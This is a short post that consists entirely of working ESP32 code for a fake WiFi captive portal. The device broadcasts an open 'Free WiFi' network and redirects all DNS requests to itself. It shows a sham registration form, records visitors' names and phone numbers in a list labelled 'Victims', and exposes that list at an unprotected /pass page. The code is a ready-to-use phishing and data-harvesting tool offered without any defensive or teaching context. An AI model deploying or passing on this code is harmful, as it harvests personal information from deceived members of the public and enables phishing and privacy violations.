### esp code for honeypot wifi

```
// ESP32 Fake WiFi Login Page

  

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

  

#define LED_BUILTIN 2

  

// Configuration

#define SSID_NAME "Free WiFi"
#define SUBTITLE "Welcome to free wifi service."
#define TITLE "Register:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please wait up to 3 minutes.</br>Thank you."
#define PASS_TITLE "Victims"
#define CLEAR_TITLE "Cleared"

  

const byte DNS_PORT = 53;

IPAddress APIP(192, 168, 29, 97);

  

String Victims = "";

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;

  

DNSServer dnsServer;
WebServer webServer(80);

  

// Sanitize and limit input

String input(String argName) {
String a = webServer.arg(argName);
a.replace("<", "&lt;");
a.replace(">", "&gt;");
a = a.substring(0, 200);

return a;

}

  

String footer() {

return "<br><footer><div><center><p>&copy; 2019-2020 | All rights reserved.</p></center></div></footer>";

}

  

String header(String t) {

String CSS =
"article { background: #f2f2f2; padding: 1.3em; }"
"body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
"div { padding: 0.5em; }"
"h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
"input { width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #08B794; }"
"label { color: #333; display: block; font-style: italic; font-weight: bold; }"
"nav { background: #08B794; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"

"nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }";

  

String h = "<!DOCTYPE html><html><head><title>" + String(SSID_NAME) + " :: " + t + "</title>"

"<meta name=viewport content=\"width=device-width,initial-scale=1\">"

"<style>" + CSS + "</style></head><body>"

"<nav><b>" + String(SSID_NAME) + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div>";

return h;

}

  

String pass() {

return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=\"/\">Back</a></p><p><a style=\"color:blue\" href=\"/clear\">Clear</a></p></center>" + footer();

}

  

String index() {

return header(TITLE) + "<div>" + BODY + "</div><div><form action=\"/post\" method=\"post\">" +

"<b>Your Name:</b> <center><input type=\"text\" name=\"email\" placeholder=\"YourName\"></center>" +

"<b>Your Phone Number:</b> <center><input type=\"number\" name=\"password\" placeholder=\"PhoneNumber\"></center>" +

"<p>&#9745; I agree to the Privacy Policy</p>" +

"<center><input type=\"submit\" style=\"background:#08B794;font-size:17px;color:white;cursor:pointer;\" value=\"Register\"></center>" +

"</form></div>" + footer();

}

  

String posted() {

String email = input("email");

String password = input("password");
Victims = "<li>NAME: <b>" + email + "</b><br>NUMBER: <b style=\"color:#ea5455;\">" + password + "</b></li>" + Victims;
return header(POST_TITLE) + POST_BODY + footer();

}

  

String clear() {

Victims = "";

return header(CLEAR_TITLE) + "<div><p>The Victims list has been reset.</p></div><center><a style=\"color:blue\" href=\"/\">Back</a></center>" + footer();

}

  

void blinkLED() {

int count = 1;

while (count <= 3) {

digitalWrite(LED_BUILTIN, LOW);
delay(500);
digitalWrite(LED_BUILTIN, HIGH);
delay(500);
count++;

}

}

  

void setup() {

pinMode(LED_BUILTIN, OUTPUT);
digitalWrite(LED_BUILTIN, HIGH);

  

Serial.begin(115200);
WiFi.mode(WIFI_AP);
WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
WiFi.softAP(SSID_NAME);

  

dnsServer.start(DNS_PORT, "*", APIP);

  

webServer.on("/post", []() {
webServer.send(200, "text/html", posted());
blinkLED();

});

  

webServer.on("/pass", []() {
webServer.send(200, "text/html", pass());

});

  

webServer.on("/clear", []() {
webServer.send(200, "text/html", clear());

});

  

webServer.onNotFound([]() {
webServer.send(200, "text/html", index());

});

  

webServer.begin();

}

  

void loop() {

dnsServer.processNextRequest();
webServer.handleClient();

}
```


